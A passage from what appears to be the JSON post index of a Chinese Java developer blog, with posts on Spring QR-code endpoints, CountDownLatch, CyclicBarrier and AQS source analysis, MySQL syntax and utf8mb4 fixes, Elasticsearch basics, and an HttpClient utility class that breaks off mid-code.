URLDecoder.decode(sid,&quot;UTF-8&quot;); String scene = sid; byte[] buffer = wechatUtil.getQrCodeUnlimited(scene,page); response.setContentType(&quot;image/jpeg&quot;); OutputStream outputStream = response.getOutputStream(); outputStream.write(buffer); outputStream.flush(); outputStream.close(); } // 下面这个方法，也可以实现 @RequestMapping(&quot;/unlimted2&quot;) public ResponseEntity&lt;byte[]&gt; getQrcodeUnlimted2(@RequestParam(value = &quot;page&quot;,required = false)String page, @RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException { sid = URLDecoder.decode(sid,&quot;UTF-8&quot;); String scene = sid; byte[] buffer = wechatUtil.getQrCodeUnlimited(scene,page); HttpHeaders headers = new HttpHeaders(); headers.setCacheControl(CacheControl.noCache().getHeaderValue()); headers.setContentType(MediaType.IMAGE_JPEG); ResponseEntity&lt;byte[]&gt; responseEntity = new ResponseEntity&lt;byte[]&gt;(buffer,headers,HttpStatus.OK); return responseEntity; } }前端可以通过修改src里面的值来修改&lt;img src=&quot;data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAUA AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO 9TXL0Y4OHwAAAABJRU5ErkJggg==&quot; alt=&quot;Red dot&quot; /&gt;具体可以参考 base64图片 中的高分答案 总结这终究是以IO操作，返回流时，加了头部信息image/jpeg 不多bb，我去当社畜了，如果有需要工具包的可以评论。","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"},{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"小程序码","slug":"小程序码","permalink":"http://yoursite.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/"}]},{"title":"CountDownLatch和CyclicBarrier分析","slug":"CountDownLatch和CyclicBarrier分析","date":"2019-10-16T07:35:52.000Z","updated":"2020-11-14T17:10:51.576Z","comments":true,"path":"2019/10/16/CountDownLatch和CyclicBarrier分析/","link":"","permalink":"http://yoursite.com/2019/10/16/CountDownLatch%E5%92%8CCyclicBarrier%E5%88%86%E6%9E%90/","excerpt":"","text":"CountDownLatch几个经常用的方法分析CountDownLatch构造函数public CountDownLatch(int count) { if (count &lt; 0) throw new IllegalArgumentException(&quot;count &lt; 0&quot;); //此处调用CountDownLatch的队列同步器 this.sync = new Sync(count); } //设置state Sync(int count) { setState(count); }CountDownLatch的await()/** * Causes the current thread to wait until the latch has counted down to * zero, unless the thread is {@linkplain Thread#interrupt interrupted}. * * &lt;p&gt;If the current count is zero then this method returns immediately. * * &lt;p&gt;If the current count is greater than zero then the current * thread becomes disabled for thread scheduling purposes and lies * dormant until one of two things happen: */ //上面翻译大意是：当前线程等待直到state到0时 //除非被打断 public void await() throws InterruptedException { sync.acquireSharedInterruptibly(1); } //调用模板方法中的tryAcquireShared(arg) public final void acquireSharedInterruptibly(int arg) throws InterruptedException { if (Thread.interrupted()) throw new InterruptedException(); if (tryAcquireShared(arg) &lt; 0) doAcquireSharedInterruptibly(arg); } //当获取到state是否等于0，返回1或者-1 protected int tryAcquireShared(int acquires) { return (getState() == 0) ? 1 : -1; }CountDownLatch中的countDown()/** * Decrements the count of the latch, releasing all waiting threads if * the count reaches zero. * * &lt;p&gt;If the current count is greater than zero then it is decremented. * If the new count is zero then all waiting threads are re-enabled for * thread scheduling purposes. * * &lt;p&gt;If the current count equals zero then nothing happens. */ //减少state数量，如果到达0，释放所有正在等待的线程 public void countDown() { sync.releaseShared(1); } public final boolean releaseShared(int arg) { if (tryReleaseShared(arg)) { doReleaseShared(); return true; } return false; } //这是CountDownLatch类型重写的模板方法 protected boolean tryReleaseShared(int releases) { // Decrement count; signal when transition to zero for (;;) { int c = getState(); if (c == 0) return false; int nextc = c-1; if (compareAndSetState(c, nextc)) //只有等于0的时候才会返回true return nextc == 0; } }CountDownLatch的官方示例* class Driver2 { // ... * void main() throws InterruptedException { * CountDownLatch doneSignal = new CountDownLatch(N); * Executor e = ... * * for (int i = 0; i &lt; N; ++i) // create and start threads * e.execute(new WorkerRunnable(doneSignal, i)); * * doneSignal.await(); // wait for all to finish * } * } * * class WorkerRunnable implements Runnable { * private final CountDownLatch doneSignal; * private final int i; * WorkerRunnable(CountDownLatch doneSignal, int i) { * this.doneSignal = doneSignal; * this.i = i; * } * public void run() { * try { * doWork(i); * doneSignal.countDown(); * } catch (InterruptedException ex) {} // return; * } * * void doWork() { ... } * }}&lt;/pre&gt; *原理构造函数N,调用await()开始，知道countDown()N次，才会继续执行后续操作具体原理，就是await()也就是lock()当前线程，（上述的例子中是main线程）,后面会调用countDown()N次，才会unlock()当前线程 CyclicBarrier例子同时计算N个示例，计算完N个示例，执行runnable里面的run()方法import java.util.Map; import java.util.concurrent.*; public class BankWaterService implements Runnable{ //创建4个屏障，处理完之后执行当前类的run方法 private CyclicBarrier cyclicBarrier = new CyclicBarrier(4,this); //假如只有4个sheet,所以启动4个线程 private ExecutorService executor = Executors.newFixedThreadPool(4); private ConcurrentHashMap&lt;String,Integer&gt; sheetBankWaterCount = new ConcurrentHashMap&lt;String,Integer&gt;(); private void count(){ try { for (int i = 0; i &lt; 4; i++) { executor.execute(new Runnable() { @Override public void run() { //计算当前i对应的sheet的银流数据，计算代码省略 try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } sheetBankWaterCount.put(Thread.currentThread().getName(), 1); //银流计算完成，插入一个屏障 try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } } }); } }finally { executor.shutdown(); } } @Override public void run(){ int result = 0; for(Map.Entry&lt;String,Integer&gt; sheet : sheetBankWaterCount.entrySet()){ result += sheet.getValue(); } System.out.println(result); } public static void main(String[] args) { BankWaterService bankWaterService = new BankWaterService(); bankWaterService.count(); } }上述代码，是为了执行计算多个sheet中的数据，最后执行合计 来测试runnable到底是最先执行还是最后执行public class CyclicBarrierTest2 { static CyclicBarrier cyclicBarrier = new CyclicBarrier(2,new A()); public static void main(String[] args) { new Thread(new Runnable() { @Override public void run() { try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.println(1); } }).start(); try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.println(2); } static class A implements Runnable{ @Override public void run() { System.out.println(3); } } } //输出结果 3 1 2源码分析要知道源码中调用的是ReentrantLock可重入式锁 /** * Main barrier code, covering the various policies. */ private int dowait(boolean timed, long nanos) throws InterruptedException, BrokenBarrierException, TimeoutException { final ReentrantLock lock = this.lock; lock.lock(); try { final Generation g = generation; if (g.broken) throw new BrokenBarrierException(); if (Thread.interrupted()) { breakBarrier(); throw new InterruptedException(); } int index = --count; //可以看到，执行了多个await()之后，导致count==0时，才会执行下面代码 if (index == 0) { // tripped boolean ranAction = false; try { final Runnable command = barrierCommand; if (command != null) //这个地方最搞笑的是他直接run了。 command.run(); ranAction = true; //此处是为下一波僵尸来临做准备 nextGeneration(); return 0; } finally { if (!ranAction) breakBarrier(); } } // loop until tripped, broken, interrupted, or timed out for (;;) { try { if (!timed) trip.await(); else if (nanos &gt; 0L) nanos = trip.awaitNanos(nanos); } catch (InterruptedException ie) { if (g == generation &amp;&amp; ! g.broken) { breakBarrier(); throw ie; } else { // We&apos;re about to finish waiting even if we had not // been interrupted, so this interrupt is deemed to // &quot;belong&quot; to subsequent execution. Thread.currentThread().interrupt(); } } if (g.broken) throw new BrokenBarrierException(); if (g != generation) return index; if (timed &amp;&amp; nanos &lt;= 0L) { breakBarrier(); throw new TimeoutException(); } } } finally { lock.unlock(); } } /** * Updates state on barrier trip and wakes up everyone. * Called only while holding lock. */ private void nextGeneration() { // signal completion of last generation trip.signalAll(); // set up next generation //重新给count赋了值，parties也就是构造函数里面的值 count = parties; generation = new Generation(); }await()这个考虑更多的是，你的线程业务执行完后，再调用await()才好执行。直到执行到最后一个，才会正在的unlock();展示一波，cyclicBarrier重用public class CyclicBarrierTest3 { static class Writer extends Thread{ private CyclicBarrier cyclicBarrier; public Writer(CyclicBarrier cyclicBarrier){ this.cyclicBarrier = cyclicBarrier; } @Override public void run() { System.out.println(&quot;线程&quot; + Thread.currentThread().getName() + &quot;正在写入数据...&quot;); try { Thread.sleep(5000); System.out.println(&quot;线程&quot; + Thread.currentThread().getName() + &quot;写入数据完毕，等待其他线程写入&quot;); cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); }catch (BrokenBarrierException e){ e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot;所有线程写入完毕，继续处理其他任务&quot;); } } public static void main(String[] args) { int N = 4; CyclicBarrier cyclicBarrier = new CyclicBarrier(N); for(int i = 0 ;i &lt; N ;i++){ new Writer(cyclicBarrier).start(); } try { Thread.sleep(25000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;Cyclicbarrier重用&quot;); for(int i = 0 ;i &lt; N ;i++){ new Writer(cyclicBarrier).start(); } } } //输出结果 线程Thread-0正在写入数据... 线程Thread-2正在写入数据... 线程Thread-1正在写入数据... 线程Thread-3正在写入数据... 线程Thread-2写入数据完毕，等待其他线程写入 线程Thread-0写入数据完毕，等待其他线程写入 线程Thread-1写入数据完毕，等待其他线程写入 线程Thread-3写入数据完毕，等待其他线程写入 Thread-2所有线程写入完毕，继续处理其他任务 Thread-1所有线程写入完毕，继续处理其他任务 Thread-3所有线程写入完毕，继续处理其他任务 Thread-0所有线程写入完毕，继续处理其他任务 Cyclicbarrier重用 线程Thread-4正在写入数据... 线程Thread-5正在写入数据... 线程Thread-6正在写入数据... 线程Thread-7正在写入数据... 线程Thread-4写入数据完毕，等待其他线程写入 线程Thread-6写入数据完毕，等待其他线程写入 线程Thread-7写入数据完毕，等待其他线程写入 线程Thread-5写入数据完毕，等待其他线程写入 Thread-5所有线程写入完毕，继续处理其他任务 Thread-4所有线程写入完毕，继续处理其他任务 Thread-6所有线程写入完毕，继续处理其他任务 Thread-7所有线程写入完毕，继续处理其他任务 部分示例来自海子的博客 还有部分代码来自：《java并发编程的艺术》 不知之处，欢迎大家留言","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"并发","slug":"并发","permalink":"http://yoursite.com/tags/%E5%B9%B6%E5%8F%91/"}]},{"title":"mysql中delete别名问题","slug":"mysql中delete别名问题","date":"2019-10-14T09:46:05.000Z","updated":"2020-11-14T17:10:52.110Z","comments":true,"path":"2019/10/14/mysql中delete别名问题/","link":"","permalink":"http://yoursite.com/2019/10/14/mysql%E4%B8%ADdelete%E5%88%AB%E5%90%8D%E9%97%AE%E9%A2%98/","excerpt":"","text":"delete from table_name t where t.column = 1 # You have an error in your SQL syntax; # check the manual that corresponds to your MySQL server version # for the right syntax to use near &apos;t where t.column = 1&apos; at line 1出现了语法错误正确写法delete &lt;alias&gt; from &lt;table&gt; &lt;alias&gt; where &lt;alias&gt;.&lt;field&gt;...","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"delete","slug":"delete","permalink":"http://yoursite.com/tags/delete/"}]},{"title":"微信昵称中表情保存到数据库问题","slug":"微信昵称中表情保存到数据库问题","date":"2019-09-30T07:36:45.000Z","updated":"2020-11-14T17:10:52.642Z","comments":true,"path":"2019/09/30/微信昵称中表情保存到数据库问题/","link":"","permalink":"http://yoursite.com/2019/09/30/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0%E4%B8%AD%E8%A1%A8%E6%83%85%E4%BF%9D%E5%AD%98%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E9%97%AE%E9%A2%98/","excerpt":"","text":"微信昵称中包含表情导致无法插入数据库java.sql.SQLException: Incorrect string value: &apos;\\xF0\\x9F\\x8E\\x80&apos; for column &apos;wechat_nick_name&apos;注意修改微信昵称后,获取微信昵称和头像是有缓存的,我这次是1个小时,缓存就刷新了 解决步骤 修改对应表中的编码 ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; 修改对应字段中的编码 ALTER TABLE table_name CHANGE column_name VARCHAR(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; 修改连接池中配置(我使用的是druid) spring: datasource: druid: connection-init-sqls: set names utf8mb4 修改数据库连接url datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&amp;autoReconnect=true其中 autoReconnect=true 总结,推荐数据库设计时,使用 utf8mb4","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"微信昵称","slug":"微信昵称","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0/"}]},{"title":"队列同步器-AbstractQueuedSynchronizer","slug":"队列同步器-AbstractQueuedSynchronizer","date":"2019-09-26T09:24:23.000Z","updated":"2020-11-14T17:10:53.225Z","comments":true,"path":"2019/09/26/队列同步器-AbstractQueuedSynchronizer/","link":"","permalink":"http://yoursite.com/2019/09/26/%E9%98%9F%E5%88%97%E5%90%8C%E6%AD%A5%E5%99%A8-AbstractQueuedSynchronizer/","excerpt":"","text":"模板方法这个队列同步器的设计就是基于模板方法 模板设计模式的定义：定义一个操作中的算法的框架，而将一些步骤延迟到子类中，使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。 大致介绍同步器依赖内部的同步队列(一个FIFO双向队列),来完成同步状态的管理,当前线程获取同步状态失败时,同步器会将当前线程以及等待信息放入到一个节点Node并将其加入同步队列,同时会阻塞当前线程,但同步状态释放时,会将首节点的线程唤醒,使其产生获取同步状态. 同步队列的节点(Node)用来 保存获取同步状态失败的线程引用 ,等待状态以及前驱和后驱节点,结点的属性类型与名称以及描述. static final class Node { //等待状态 volatile int waitStatus; //前驱 volatile Node prev; //后驱 volatile Node next; //获取同步状态失败的线程引用 volatile Thread thread; Node nextWaiter; }节点是构成同步队列的基础,同步器拥有首节点和尾结点,没有成功获取同步状态的线程将会加入该队列的尾部. 试想一下,一个线程获取同步状态成功,其他线程无法获取同步状态,转而去构造结点并加入同步队列,而加入队列必须是线程安全的(因为这个可能是竞争的,很多线程没获取到,然后竞争加入队列).同步器提供了基于CAS的设置尾结点的方法:compareAndSetTail(Node except,Node Update) @Override protected boolean tryAcquire(int arg) { if(compareAndSetState(0,1)){ setExclusiveOwnerThread(Thread.currentThread()); return true; } return false; }上面这个是某个重写 tryAcquire(int arg) 方法的. 同步队列遵循FIFO. 独占式获取同步状态通过调用同步器的acquire(intarg)方法可以获取同步状态,该方法对中断不敏感,也就是由于线程获取同步状态失败后进入同步队列,后续对线程进行中断操作时,线程不会从同步队列中移除 public final void acquire(int arg) { if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } //该方法就是创建一个节点,然后试图去创建一个双向链表的尾结点 private Node addWaiter(Node mode) { Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure //此处可以看到,它在创建成功后会立刻尝试去加入尾结点,如果失败就会进入下面的enq的for循环里面 Node pred = tail; if (pred != null) { node.prev = pred; if (compareAndSetTail(pred, node)) { pred.next = node; return node; } } enq(node); return node; } private Node enq(final Node node) { for (;;) { Node t = tail; if (t == null) { // Must initialize //如果首节点不存在,就创建它, if (compareAndSetHead(new Node())) tail = head; } else { //此处就是for循环插入为节点,CAS式必将并设置 node.prev = t; if (compareAndSetTail(t, node)) { t.next = node; return t; } } } } /** * Convenience method to interrupt current thread. 阻塞当前线程 */ static void selfInterrupt() { Thread.currentThread().interrupt(); } final boolean acquireQueued(final Node node, int arg) { boolean failed = true; try { boolean interrupted = false; for (;;) { //当前结点的前驱结点p, final Node p = node.predecessor(); //如果p是头结点,并且尝试获取 if (p == head &amp;&amp; tryAcquire(arg)) { //获取成功,将该结点设置为头结点 setHead(node); p.next = null; // help GC failed = false; return interrupted; } if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } } private void setHead(Node node) { //赋给头结点 head = node; node.thread = null; node.prev = null; }上述代码主要逻辑是:首先调用 自定义同步器实现的tryAcquire(int arg)方法,该方法保证线程安全的获取同步状态,如果同步状态获取失败就构造一个同步节点(独占式的Node.EXCLUSIVE,同一时刻只有一个线程获取同步状态成功)并通过addWriter(Nodenode)方法将该结点加入同步队列尾部,最后调用acquireQueued(Node node,intarg),使得该结点以死循环方式获取通过状态.最后,如果获取不到同步状态,就阻塞结点中的线程,而被阻塞线程的唤醒主要依靠前驱结点的出队或阻塞线程被中断来实现.可以看出,enq(final Node node)方法将并发添加及诶到哪 的请求通过CAS变得””串行化 由于非首节点线程前驱结点出队或者被中断而从等待状态返回,随后检查自己的前驱是否是头结点,如果是就尝试获取同步状态.可以看出,节点和节点之间在循环检查中是互相不通信的,而正是检查自己的前驱是否是头结点,这样就可以使得节点的释放规则符合FIFO,并且也便于对过早通知的处理(过早通知是指前驱节点不是头结点的线程由于终端被唤醒) 同步器release方法public final boolean release(int arg) { if (tryRelease(arg)) { Node h = head; if (h != null &amp;&amp; h.waitStatus != 0) unparkSuccessor(h); return true; } return false; } private void unparkSuccessor(Node node) { /* * If status is negative (i.e., possibly needing signal) try * to clear in anticipation of signalling. It is OK if this * fails or if status is changed by waiting thread. */ int ws = node.waitStatus; if (ws &lt; 0) compareAndSetWaitStatus(node, ws, 0); /* * Thread to unpark is held in successor, which is normally * just the next node. But if cancelled or apparently null, * traverse backwards from tail to find the actual * non-cancelled successor. */ Node s = node.next; if (s == null || s.waitStatus &gt; 0) { s = null; for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev) if (t.waitStatus &lt;= 0) s = t; } if (s != null) LockSupport.unpark(s.thread); }当前线程获取同步状态并执行相应逻辑之后,就需要释放同步方法,使得后续节点能够继续获取同步状态.通过调用同步器的 relase(int arg)方法可以释放同步状态,该方法在释放了同步状态之后,会唤醒其后续节点. 分析了独占式同步状态获取和释放过程后，适当做个总结：在获取同步状态时，同步器维护一个同步队列，获取状态失败的线程都会被加入到队列中并在队列中进行自旋；移出队列（或停止自旋）的条件是前驱节点为头节点且成功获取了同步状态。在释放同步状态时，同步器调用tryRelease(int arg) 方法释放同步状态，然后唤醒头节点的后继节点。 共享式获取同步状态public final void acquireShared(int arg) { if (tryAcquireShared(arg) &lt; 0) doAcquireShared(arg); } private void doAcquireShared(int arg) { final Node node = addWaiter(Node.SHARED); boolean failed = true; try { boolean interrupted = false; for (;;) { final Node p = node.predecessor(); if (p == head) { int r = tryAcquireShared(arg); if (r &gt;= 0) { setHeadAndPropagate(node, r); p.next = null; // help GC if (interrupted) selfInterrupt(); failed = false; return; } } if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } }在 acquireShared(int arg) 方法中，同步器调用tryAcquireShared(int arg)方法尝试获取同步状态， tryAcquireShared(int arg)返回值是int类型，但返回值大于0就代表可以获取同步状态。因此在共享式获取的自旋过程中，成功获取到同步状态并退出自旋的条件就是tryAcquireShared(intarg)大于等于0 释放同步状态public final boolean releaseShared(int arg) { if (tryReleaseShared(arg)) { doReleaseShared(); return true; } return false; }释放同步状态一般是通过循环和cas来保证，因为释放同步状态的操作会同时来自多个线程。","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"aqs","slug":"aqs","permalink":"http://yoursite.com/tags/aqs/"}]},{"title":"mysql in有序查询","slug":"mysql in有序查询","date":"2019-09-19T09:28:15.000Z","updated":"2020-11-14T17:10:54.140Z","comments":true,"path":"2019/09/19/mysql in有序查询/","link":"","permalink":"http://yoursite.com/2019/09/19/mysql%20in%E6%9C%89%E5%BA%8F%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"select * from hair_system_hairstyle where id in (24,23,25) 如果想要查询根据,24,23,25顺序select * from hair_system_hairstyle where id in (24,23,25) order by field(id,24,23,25)效果","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"elasticsearch基础篇","slug":"elasticsearch基础篇","date":"2019-09-18T15:29:27.000Z","updated":"2020-11-14T17:10:55.291Z","comments":true,"path":"2019/09/18/elasticsearch基础篇/","link":"","permalink":"http://yoursite.com/2019/09/18/elasticsearch%E5%9F%BA%E7%A1%80%E7%AF%87/","excerpt":"","text":"安装安装elasticSearch和kibana 简单应用一个Elasticsearch集群可以包含多个索引(index),相应的每个索引可以包含多个类型(type).这些不同的类型存储着多个文档,每个文档又有多个属性 放入信息PUT /megacorp/employee/1 { &quot;first_name&quot; : &quot;John&quot;, &quot;last_name&quot; : &quot;Smith&quot;, &quot;age&quot; : 25, &quot;about&quot; : &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } PUT /megacorp/employee/2 { &quot;first_name&quot; : &quot;Jane&quot;, &quot;last_name&quot; : &quot;Smith&quot;, &quot;age&quot; : 32, &quot;about&quot; : &quot;I like to collect rock albums&quot;, &quot;interests&quot;: [ &quot;music&quot; ] } PUT /megacorp/employee/3 { &quot;first_name&quot; : &quot;Douglas&quot;, &quot;last_name&quot; : &quot;Fir&quot;, &quot;age&quot; : 35, &quot;about&quot;: &quot;I like to build cabinets&quot;, &quot;interests&quot;: [ &quot;forestry&quot; ] }其中 megacorp 索引名称, employee 类型名称, 1 是特定雇员的ID 检索单个雇员GET /megacorp/employee/1 返回值, { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;1&quot;, &quot;_version&quot;: 1, &quot;found&quot;: true, &quot;_source&quot;: { &quot;first_name&quot;: &quot;John&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 25, &quot;about&quot;: &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } }轻量搜素获取所有雇员 GET /megacorp/employee/_search查询字符串 GET /megacorp/employee/_search?q=last_name:smith 结果 { &quot;took&quot;: 110, &quot;timed_out&quot;: false, &quot;_shards&quot;: { &quot;total&quot;: 5, &quot;successful&quot;: 5, &quot;skipped&quot;: 0, &quot;failed&quot;: 0 }, &quot;hits&quot;: { &quot;total&quot;: 2, &quot;max_score&quot;: 0.2876821, &quot;hits&quot;: [ { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;2&quot;, &quot;_score&quot;: 0.2876821, &quot;_source&quot;: { &quot;first_name&quot;: &quot;Jane&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 32, &quot;about&quot;: &quot;I like to collect rock albums&quot;, &quot;interests&quot;: [ &quot;music&quot; ] } }, { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;1&quot;, &quot;_score&quot;: 0.2876821, &quot;_source&quot;: { &quot;first_name&quot;: &quot;John&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 25, &quot;about&quot;: &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } } ] } }查询的时候,会发现,真实数据中last_name是Simth,都查询出来了,但是有 _score这个标签,_score是一种确定匹配与查询的相关程度的方法. 使用查询表达式搜素GET /megacorp/employee/_search { &quot;query&quot;: { &quot;match&quot;: { &quot;last_name&quot;: &quot;smith&quot; } } }可以发现,和上面的查询是一样的 复杂的搜索GET /megacorp/employee/_search { &quot;query&quot; : { &quot;bool&quot;: { &quot;must&quot;: { &quot;match&quot; : { &quot;last_name&quot; : &quot;smith&quot; } }, &quot;filter&quot;: { &quot;range&quot; : { &quot;age&quot; : { &quot;gt&quot; : 30 } } } } } }搜索最后一个名字是smith的,并过滤其中年龄大于30岁的 全文搜索GET /megacorp/employee/_search { &quot;query&quot;:{ &quot;match&quot;:{ &quot;about&quot;: &quot;rock climbing&quot; } } }可以找到两条,其中一条数据是 &quot;about&quot;: &quot;I love to go rock climbing&quot; 还有一条是 &quot;about&quot;: &quot;I like to collect rock albums&quot; 为什么第二条也有呢,因为提到了rock,只是_score相应的低了一点 短语查找GET /megacorp/employee/_search { &quot;query&quot;:{ &quot;match_phrase&quot;: { &quot;about&quot;: &quot;rock climbing&quot; } } }可以精确查找","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"http://yoursite.com/tags/elasticsearch/"}]},{"title":"mysql loop","slug":"mysql loop","date":"2019-09-17T03:19:27.000Z","updated":"2020-11-14T17:10:56.179Z","comments":true,"path":"2019/09/17/mysql loop/","link":"","permalink":"http://yoursite.com/2019/09/17/mysql%20loop/","excerpt":"","text":"mysql中循环,查找并插入数据DELIMITER // DROP PROCEDURE IF EXISTS doWhile; CREATE PROCEDURE doWhile() BEGIN DECLARE hair_id VARCHAR(300); DECLARE sortx INT DEFAULT 0; DECLARE review_id INT; DECLARE cursor1 CURSOR FOR (SELECT system_hairstyle_id,sortx FROM hair_system WHERE status = 1); set review_id = 99; OPEN cursor1; read_loop: LOOP FETCH FROM cursor1 INTO hair_id,sortx; INSERT INTO hair_store (review_id,system_hairstyle_id,sort,status) VALUE (review_id, hair_id,sortx,1); END LOOP; CLOSE cursor1; END; // CALL doWhile(); 这句语句是是定义了部分变量,并从cursor中读取信息,并将相应信息放入到新表中 [ 来源 ](https://pritomkumar.blogspot.com/2017/06/mysql-insert-with-while-loop-use-loop.html)","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"mysql loop","slug":"mysql-loop","permalink":"http://yoursite.com/tags/mysql-loop/"}]},{"title":"httpClient工具类","slug":"httpClient工具类","date":"2019-09-05T07:59:31.000Z","updated":"2020-11-14T17:10:56.748Z","comments":true,"path":"2019/09/05/httpClient工具类/","link":"","permalink":"http://yoursite.com/2019/09/05/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/","excerpt":"","text":"httpClient工具类pom配置&lt;!-- apache httpclient组件 start--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- apache httpclient组件 end--&gt; &lt;!-- fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.58&lt;/version&gt; &lt;/dependency&gt; &lt;!-- fastjson END --&gt;工具包import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.apache.http.NameValuePair; import org.apache.http.client.config.RequestConfig; import org.apache.http.client.entity.UrlEncodedFormEntity; import org.apache.http.client.methods.*; import org.apache.http.client.utils.URIBuilder; import org.apache.http.entity.StringEntity; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClients; import org.apache.http.message.BasicNameValuePair; import org.apache.http.util.EntityUtils; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.net.URI; import java.util.ArrayList; import java.util.List; import java.util.Map; import java.util.Set; /** * Description:httpclient工具类 * @author husky * @date 2019/9/5 11:35 */ public class HttpClientUtil { /** * ENCODING 编码格式。发送编码格式统一用UTF-8 * */ private static final String ENCODING = &quot;UTF-8&quot;; /** * CONNECT_TIMEOUT 设置连接超时时间，单位毫秒。 * */ private static final int CONNECT_TIMEOUT = 6000; /** * SOCKET_TIMEOUT 请求获取数据的超时时间(即响应时间)，单位毫秒。 */ private static final int SOCKET_TIMEOUT = 6000; /** * 发送get请求:带请求头和请求参数 * @param url 请求地址 * @param headers 请求头 * @param params 请求参数集合 * @return JSONObject * @throws Exception */ public static JSONObject doGet(String url, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception { //创建httpClient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); URIBuilder uriBuilder = new URIBuilder(url); if (params != null) { Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { uriBuilder.setParameter(entry.getKey(), entry.getValue()); } } URI uri = uriBuilder.build(); HttpGet httpGet = new HttpGet(uri); //设置参数 httpGet.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //设置请求头 packageHeader(headers,httpGet); CloseableHttpResponse httpResponse = null; try { return getResponse(httpResponse,httpClient,httpGet); }finally { release(httpResponse,httpClient); } } /** * description 表单方式的post * @param url 请求地址 * @param headers 请求头 * @param params 请求参数 * @return JSONObject * @throws Exception */ public static JSONObject doFormPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{ // 创建httpClient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); // 创建http对象 HttpPost httpPost = new HttpPost(url); 